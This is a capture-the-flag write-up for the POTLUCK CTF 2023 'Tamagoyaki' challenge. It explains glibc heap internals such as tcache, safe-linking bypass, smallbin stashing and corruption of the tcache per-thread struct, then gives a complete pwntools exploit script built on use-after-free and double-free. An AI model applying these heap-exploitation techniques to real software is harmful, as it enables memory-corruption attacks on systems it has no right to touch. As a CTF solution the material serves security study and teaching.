---
title: POTLUCKCTF-2023 TAMAGOYAKI
draft: false
tags:
  - blog
  - heap-exploitation
  - ctf-writeups
date: 02-06-2024
---

#heap_exploitation #writeups 
___
### TAMAGOYAKI << POTLUCK CTF 2023

##### CODE REVIEW -
The code has the following functions 
- dinner()
> Checks if a byte sequence exist in an mmapped region which we do not know the location of, If it exists it prints out the flag.
- do_malloc()
> Calls malloc where we control what size is allocated and which offset to that we write to
- do_free()
> Calls free where we control what pointer is freed, and no pointers are nulled out i.e we can free more than once any pointer that we choose.

During the setup stage a function prep() is called which mmaps at a random offset and puts the flag there and checks if a write was made to the location. The function after that puts the address in an 0x18 malloc chunk which would be the first chunk in the heap after the tcache per thread struct. 
##### CHALLENGE SUMMARY
To get to the mmapped region and mark the offset with the following `0x37C3C7F` byte sequence which will write out the flag when you call the function dinner.
The challenge here requires you to do the following without getting any leaks for the mmapped region or without leaking any heap pointers to arrive at that place and write the bytes in the offset. 
This would have been quite simple without safelinking in place as we could go for the following approach
- fill up tcache
- somehow make a tcache point to the 0x21 chunk using partial overwrites on the heap pointers.
- Allocate tcache twice to get the mmaped location as the chunk.
- Noice
But that is not the case, thus we have to find some way to get around safe-linking here. The only way I think it is possible is somehow making the protect_ptr function encrypt and decrypt a custom pointer that we provide but not mess up tcache internally.

OBSERVATIONS THAT COULD HELP US >>
- Tcache pointers dont get nulled out when the chunk is returned to the user
- When one tcache chunk is added onto the list it does an ENCRYPT_PTR of the current top of tcache and adds it to the list
- Within the tcache_perthread struct the ptrs are saved as normal pointers.
- During allocation from tcache the head of the tcache list is placed after doing REVEAL_PTR on the pointer.
- The tcache perthread struct is present within the heap itself
##### CORRUPTING THE TCACHE PER-THREAD-STRUCTURE

The following idea is similar to that of HOUSE OF IO which I discovered afterwards.

If we construct a 0x290 chunk and make the tcache fd pointer to zero, the tcache struct itself would get linked onto tcache freelist. Which would be very useful for any other exploit strategy as we would end up corrupting the whole tcache, similar to forging a whole arena which controls allocations. But here we are lacking functions that could leak values which thus results in this strategy being almost useless as we dont know what addresses to write. But since we have an offset control we can corrupt the pointers here instead to cause the tcache to redirect the chunk to the 0x21 chunk. But from there it is hard to see the future as the pointer is not encrypted, The REVEAL_PTR function will just segfault as it tries to access invalid memory. 

This strategy only requires the following >>
- Being able to allocate a chunk of size 0x290 
- Getting a UAF in tcache to wipe of the tcache key and null out the pointer

We have both of these conditions so the first step is taken care of, but how do we encrypt the pointer that we don't know the address of or do we have to encrypt it in the first place ?
##### CURRENT EXPLOIT STRATEGY >>
- allocate an 0x290 tcache chunk.
- Using overlapping chunks / some other primitive wipe out the tcache cookie and null out the tcache pointer.
- Allocate another 0x290 chunk, this would occupy the tcache_perthread_structure.
- modify addresses placed in the structure through partial overwrites and repeatedly freeing the addresses and changing offsets
- Make one of the addresses point to the 0x21 chunk which will then be occupied while its pointer gets DECRYPTED and ends up in the tcache perthread structure
- Make another tcache struct address point to a fake location which is occupied by the pointer which was present in the 0x21 chunk, Allocate a chunk of that size but dont write anything this time.
- This would result in the unmangled version of the pointer ending up in one of the tcache struct entries.
- Allocate a chunk of that size and write the value `0x37C37F` 
- Muney

One challenge we are going to face is the lack of coalescing tcache has which in turn means if we want to get overlapping chunks we must fill tcache

ANOTHER WAY TO CORRUPT A TCACHE PTR -->
Corrupt small bin through a partial overwrite after which it directly corrupts tcache if you try making it fill up correctly. The smallbin pointers are not mangled thus causing us to be able to write to its bytes with a chance of 1/16 success.

NEW METHOD >>
When corrupting smallbins you can place an intermediate ptr just before a chunk which malloc would not check if you have a UAF on a smallbin

NORMALLY >>

```
[BK][BIN][FD]->>-[BK][C1][FD]->>-[BK][C2][FD]-|
  |___________________<<______________________|

This would be the normal linked list in which we corrupt the bk of the second chunk
[BK][BIN][FD]->>-[BK][C1][FD]->>-[BK][FAKE][FD]-->>--[BK][C2][FD]-|
  |___________________<<_________________<<_______________________|

Unlike normal chunks the only restriction for this chunk is that it should point back to the c1 chunk.
This would mean that the fake chunk ends up in tcache during tcache small-bin stashing even if it doesnt meet normal chunk criterias. Giving us an arbitrary write given right conditions. This also does not corrupt the smallbin as a bonus thus making it possible to get an allocation through tcache as the bk pointer will be fixed. 
This can also be used to write an abritrarily large value somewhere in memory.
I would have to see into it more but I do assume it should work.
```

So using the following method you can corrupt the tcache perthread struct which then allows you to edit the pointers in the structure thus giving you almost complete control over heap allocations. 

STRATEGY TO CORRUPT THE TCACHE PERTHREAD STRUCTURE -
- Gain first allocation on the struct
	- place pointer to make bk of smallbin point back to valid smallbin chunk
	- Get an intermediate smallbin chunk to point to the pointer at the struct
	- Pull of the tcache diversion attack
	- Get an allocation in the struct by allocating two more chunks

After this you can pull of the previous strategy we discussed to get a tcache chunk to point to the mmapped location and an allocation of that bin size will lead you to get the chunk and the allocation in the region where you can write the value to get the flag.


```python
from pwn import *

exe = './Tamagoyaki_patched'

(host,port_num) = ("localhost",1337)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gscpt, *a, **kw)
    elif args.RE:
        return remote(host,port_num)
    else:
        return process( 
            [exe] + argv, *a, **kw)
    
gscpt = (
    '''
b * main
'''
).format(**locals())

context.update(arch='amd64')

# SHORTHANDS FOR FNCS
se  = lambda nbytes     : p.send(nbytes)
sl  = lambda nbytes     : p.sendline(nbytes)
sa  = lambda msg,nbytes : p.sendafter(msg,nbytes)
sla = lambda msg,nbytes : p.sendlineafter(msg,nbytes)
rv  = lambda nbytes     : p.recv(nbytes)
rvu = lambda msg        : p.recvuntil(msg)
rvl = lambda            : p.recvline()

def w(*args):
    print(f"〔\033[1;32m>\033[0m〕",end="")
    for i in args:
        print(hex(i)) if(type(i) == int) else print(i,end=" ")
    print("")

context.log_level = \
    'DEBUG'

# _____________________________________________________ #
# <<<<<<<<<<<<<<< EXPLOIT STARTS HERE >>>>>>>>>>>>>>>>> #

freed = []
dictt = {}
index = 0x0

def malloc(size,data,name,offset=0):
    global index
    sla(b"> ",b"1")
    sla(b"size: ",str(size).encode())
    sla(b"offset: ",str(offset).encode())
    sa(b"buffer: ",data)
    dictt[name] = index
    index += 1

def free(name):
    sla(b"> ",b"2")
    sla(b"idx: ",str(dictt[name]).encode())

def gimme_dinner():
    sla(b"> ",b"3")

context.aslr = False

p = start()

# WE CAN ALLOCATE A TOTAL OF 128 CHUNKS

# IDK COULD BE USEFUL
malloc(0x18,b"S1","v1")

# FILLING UP AN 0X70 TCACHE AND THEN PLACING POINTERS 
# AT PLACES USING FASTBINS
for i in range (9):
    malloc(0x70,b"sugu",f"s{i}")

for i in range (9):
    free(f"s{i}")

# CAUSING A MALLOC CONSOLIDATE CALL TO COALESCE FASTBINS
fake_chnk = p64(0x0) + p64(0x291) + 0x288*b"a" + p64(0x191)
malloc(0x490,fake_chnk,"c1",offset=0x70)

# FILLING UP TCACHE CHUNKS OF SIZE-RANGE
for i in range (8):
    malloc(0x288,b"sugu",f"tfill{i}")

malloc(0x18,b"FENCEPOST",f"post1")

# FILL UP THE TCACHE FOR THE SIZE 0X291
for i in range (7):
    free(f"tfill{i}")

# CURRENT GOAL IS TO PLACE A POINTER IN TCACHE_PER_THREAD STRUCTURE
# PLACING PTRS USING MALLOC CONSOLIDATE
for i in range (9):
    malloc(0x70,b"sugu",f"r{i}")

for i in range (9):
    free(f"r{i}")

# CRAFTING THE CHUNK TO PUT A TCACHE CHUNK PTR
fake_chnk = p64(0x0) + p64(0x551) + 0x548*b"a" + p64(0x61)
malloc(0x600,fake_chnk,"POP",offset=0x70)

malloc(0x18,b"FENCEPOST","post2")
malloc(0x420,b"CLAYCHUNK","SF1")
malloc(0x18,b"FENCEPOST","post3")

# FREEING FAKE CHUNK
free("SF1")
malloc(0x1b0,"TEMPCHUNK","tmp1")

free("r8")
malloc(0x2d8,"TEMPCHUNK","tmp1")

# SHUFFLING UNSORTED BIN
malloc(0x500,b"SHUFFLE","shuf")
free("shuf")

# PUTTING THE TCACHE PTR IN PLACE BY ALLOCATING TO SMALLBIN
# AND USING THE SMALLBIN STASHING PROCEDURE
malloc(0x268,"OCCUPY","t280")

free("POP")
fake_chnk = p64(0x0) + p64(0x581) + 0x578*b"a" + p64(0x31)
malloc(0x600,fake_chnk,"POP2",offset=0x70)

free("tfill7")

free("s8")

free("r8")
malloc(0x2e8,"TEMPCHUNK","tmp2")

# SHUFFLING UNSORTED BIN
malloc(0x500,b"SHUFFLE","shuf2")
free("shuf2")

# USING TCACHE ALLOCATIONS
for i in range (7):
    malloc(0x288,"FILLER",f"W{i}")

# DOING A SMALLBIN STASH BY REQUESTING SMALLBIN SIZE
free("c1")
fake_chnk = b"\xa0\xa1"
malloc(0x490,fake_chnk,"c1.1",offset=0x88)

malloc(0x288,"CHUNK1","CH0")
malloc(0x288,"CHUNK2","P2")

# WRITING A SIZE FIELD TO GET A PERSISTENT ALLOCATION IN THE CHUNK
payload = p64(0x1a1)
malloc(0x288,payload,"Q1",offset=0x28)

malloc(0x288,"CHUNK3","CH1")

# GOING HAM ALL OVER AGAIN
for i in range (7):
    free(f"W{i}")

# CORRUPTING TCACHE 0X2d0 TO SET POINTERS
free("POP2")
fake_chnk = p64(0x0) + p64(0x581) + 0x578*b"a" + p64(0x41)
malloc(0x600,fake_chnk,"POP3",offset=0x70)

free("r8")
malloc(0x2a1,"SOMETHING","tmp2")

malloc(0x2c8,"LOWPTR","LOWPTR")

free("LOWPTR")

free("POP3")
fake_chnk = p64(0x0) + p64(0x581) + 0x578*b"a" + p64(0x31)
malloc(0x600,fake_chnk,"POP4",offset=0x70)

free("r8")

malloc(0x2b8,"TEMPCHUNK","tmp2")
malloc(0x2b8,"REQUIREDPTR","CH2")

free("POP4")
fake_chnk = p64(0x291) + 0x288*b"a" + p64(0x41)
malloc(0x600,fake_chnk,"POP5",offset=0x338)

free("CH0")
free("CH1")
free("CH2")

# SHUFFLING UNSORTED BIN
malloc(0x500,b"SHUFFLE","shuf3")
free("shuf3")

free("c1")
fake_chnk = b"\xd0\xa1"
malloc(0x490,fake_chnk,"c1.1",offset=0x88)

# USING TCACHE ALLOCATIONS
for i in range (7):
    malloc(0x288,"FIRSTALLOC",f"W{i}")

malloc(0x288,"FINALE1","F1")
malloc(0x288,"FINALE1","F1")

payload = p64(0x2f0)
malloc(0x288,payload,"W",offset=0xb8)
malloc(0x2f0,"WIN2","L")
free("L")
malloc(0x310,"WIN2","L")
malloc(0x310,"WIN2","L0")
free("L")
free("L0")

free("W")
payload = b"\xa0\xa2"
malloc(0x198,payload,"W.0",offset=0x20)

malloc(0x2f0,"WIN3","L")

free("W.0")
payload = b"\x00\xa2"
malloc(0x198,payload,"W.1",offset=0x30)

payload = p64(0x37c3c7f)
malloc(0x310,"FINAL","W",offset=0x0)
malloc(0x310,payload,"W",offset=0x0)

gimme_dinner()

p.interactive()
```
